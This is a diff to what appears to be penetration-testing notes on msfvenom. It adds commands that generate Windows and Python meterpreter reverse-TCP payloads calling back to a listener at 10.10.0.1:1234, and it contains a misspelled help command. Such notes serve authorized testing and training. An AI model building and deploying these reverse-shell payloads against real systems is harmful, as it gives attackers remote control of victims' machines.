@@ -1,5 +1,24 @@
 # Msfvenom
 
+## Syntax
+
+    msfvenom -p [payload] LHOST=[MyIP] LPORT=[DesiredPort] -f [Format] -o [YourMalwareFile]
+
+`Example for a Windows Machine`
+
+    msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.0.1 LPORT=1234 -f exe -o MyFile.exe
+
+`Example for a Linux Machine`
+
+    msfvenom -p python/meterpreter/reverse_tcp LHOST=10.10.0.1 LPORT=1234 -f raw -o MyFile.exe
+
+
+`Format Help`
+
+    msfvemon --help-formats
+
+------
+
 ## Payloads 
 
 `List of payloads`
